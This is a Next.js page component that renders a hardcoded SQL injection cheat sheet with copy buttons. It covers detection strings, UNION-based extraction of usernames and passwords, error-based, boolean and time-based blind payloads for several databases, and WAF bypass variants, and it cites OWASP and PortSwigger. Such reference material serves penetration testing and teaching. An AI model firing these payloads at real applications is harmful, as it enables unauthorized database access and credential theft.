import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { ExternalLink, ArrowLeft } from "lucide-react"
import Link from "next/link"
import CopyButton from "@/components/copy-button"

interface ResourcePageProps {
  params: {
    slug: string
  }
}

export default function ResourcePage({ params }: ResourcePageProps) {
  // This would normally come from a database or API
  // For this example, we'll just hardcode the SQL Injection content
  const resource = {
    title: "SQL Injection Cheat Sheet",
    description: "A comprehensive guide to SQL injection techniques and bypasses",
    category: "Web Attacks",
    lastUpdated: "2023-05-15",
    content: [
      {
        type: "section",
        title: "Introduction",
        content:
          "SQL injection is a code injection technique that exploits a security vulnerability occurring in the database layer of an application. The vulnerability is present when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed.",
      },
      {
        type: "section",
        title: "Detection",
        content:
          "The first step in exploiting SQL injection is to detect if a vulnerability exists. Common methods include:",
        items: [
          "Adding a single quote (') to the parameter value to see if it causes an error",
          "Using logical operators (AND 1=1, AND 1=2) to see if they affect the response",
          "Using timing attacks with SLEEP() or BENCHMARK() functions",
        ],
      },
      {
        type: "code",
        title: "Basic Detection Payloads",
        language: "sql",
        code: `-- Basic tests
parameter'
parameter''
parameter"
parameter""
parameter\`
parameter\`\`

-- Logic tests
parameter OR 1=1
parameter AND 1=1
parameter AND 1=2

-- Timing attacks
parameter' AND (SELECT 1 FROM (SELECT SLEEP(10))A) AND '1'='1
parameter' AND SLEEP(10) AND '1'='1`,
      },
      {
        type: "section",
        title: "Union Based SQL Injection",
        content:
          "UNION attacks are used to extract data from the database by combining the results of the original query with the results of an injected query.",
      },
      {
        type: "code",
        title: "UNION Attack Payloads",
        language: "sql",
        code: `-- Determine the number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,column_name FROM information_schema.columns--
' UNION SELECT 1,concat(table_name) FROM information_schema.tables--`,
      },
      {
        type: "section",
        title: "Error-Based SQL Injection",
        content:
          "Error-based SQL injection techniques force the database to generate an error that contains the results of your injected query.",
      },
      {
        type: "code",
        title: "Error-Based Payloads",
        language: "sql",
        code: `-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1

-- PostgreSQL
' AND 1=cast((SELECT version()) as int) AND '1'='1

-- SQLite
' AND 1=CAST((SELECT sqlite_version()) as int) AND '1'='1

-- SQL Server
' AND 1=convert(int,(SELECT @@version)) AND '1'='1`,
      },
      {
        type: "section",
        title: "Blind SQL Injection",
        content:
          "Blind SQL injection is used when the application does not return error messages or the results of your query, but the query still executes.",
      },
      {
        type: "code",
        title: "Boolean-Based Blind Payloads",
        language: "sql",
        code: `-- Test if 'admin' exists in the users table
' AND (SELECT 'x' FROM users WHERE username='admin')='x'--

-- Extract data character by character
' AND (SELECT substring(username,1,1) FROM users WHERE id=1)='a'--
' AND (SELECT ASCII(substring(username,1,1)) FROM users WHERE id=1)=97--

-- Binary search approach
' AND (SELECT ASCII(substring(username,1,1)) FROM users WHERE id=1)<128--
' AND (SELECT ASCII(substring(username,1,1)) FROM users WHERE id=1)<64--`,
      },
      {
        type: "code",
        title: "Time-Based Blind Payloads",
        language: "sql",
        code: `-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT 'x' FROM users WHERE username='admin')='x',SLEEP(5),0)--

-- PostgreSQL
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--

-- SQL Server
' IF (1=1) WAITFOR DELAY '0:0:5'--
' IF (SELECT COUNT(username) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5'--`,
      },
      {
        type: "section",
        title: "WAF Bypass Techniques",
        content:
          "Web Application Firewalls (WAFs) often block common SQL injection patterns. Here are some techniques to bypass them:",
      },
      {
        type: "code",
        title: "WAF Bypass Payloads",
        language: "sql",
        code: `-- Case variation
' UnIoN SeLeCt 1,2,3--

-- Comment variations
'/**/UNION/**/SELECT/**/1,2,3--
' UN/**/ION SEL/**/ECT 1,2,3--

-- Encoding
' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--

-- Alternative operators
' || (SELECT 1) || '
' + (SELECT 1) + '

-- Double encoding
%2527 instead of '`,
      },
      {
        type: "section",
        title: "References",
        content: "Additional resources for learning about SQL injection:",
        items: [
          {
            text: "OWASP SQL Injection",
            url: "https://owasp.org/www-community/attacks/SQL_Injection",
          },
          {
            text: "PortSwigger SQL Injection Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
          },
          {
            text: "PayloadsAllTheThings SQL Injection",
            url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
          },
        ],
      },
    ],
  }

  return (
    <div className="container py-8">
      <div className="flex flex-col gap-6">
        <Button variant="ghost" size="sm" asChild className="self-start hover:bg-primary/10">
          <Link href="/resources" className="flex items-center gap-1">
            <ArrowLeft className="h-4 w-4" />
            Back to resources
          </Link>
        </Button>

        <div>
          <div className="flex items-center gap-2 mb-2">
            <Badge variant="outline" className="bg-primary/10 text-primary border-primary/30">
              {resource.category}
            </Badge>
            <span className="text-sm text-muted-foreground">Last updated: {resource.lastUpdated}</span>
          </div>
          <h1 className="text-3xl font-bold mb-2">{resource.title}</h1>
          <p className="text-muted-foreground max-w-3xl">{resource.description}</p>
        </div>

        <div className="flex flex-col gap-8">
          {resource.content.map((section, index) => {
            if (section.type === "section") {
              return (
                <div key={index} className="space-y-4">
                  <h2 className="text-2xl font-bold">{section.title}</h2>
                  <p className="text-muted-foreground">{section.content}</p>
                  {section.items && Array.isArray(section.items) && !section.items[0]?.url && (
                    <ul className="list-disc pl-6 space-y-2 text-muted-foreground">
                      {section.items.map((item, itemIndex) => (
                        <li key={itemIndex}>{item}</li>
                      ))}
                    </ul>
                  )}
                  {section.items && Array.isArray(section.items) && section.items[0]?.url && (
                    <ul className="space-y-2">
                      {section.items.map((item: any, itemIndex) => (
                        <li key={itemIndex}>
                          <a
                            href={item.url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="flex items-center gap-2 text-primary hover:underline"
                          >
                            {item.text}
                            <ExternalLink className="h-3 w-3" />
                          </a>
                        </li>
                      ))}
                    </ul>
                  )}
                </div>
              )
            } else if (section.type === "code") {
              return (
                <div key={index} className="space-y-2">
                  <div className="flex items-center justify-between">
                    <h3 className="text-xl font-bold">{section.title}</h3>
                    <CopyButton text={section.code} />
                  </div>
                  <Card className="bg-background/40 backdrop-blur-sm border-primary/20">
                    <CardContent className="p-0">
                      <pre className="bg-muted/50 p-4 rounded-md overflow-x-auto border border-primary/20">
                        <code className="text-sm text-primary whitespace-pre">{section.code}</code>
                      </pre>
                    </CardContent>
                  </Card>
                </div>
              )
            }
            return null
          })}
        </div>
      </div>
    </div>
  )
}
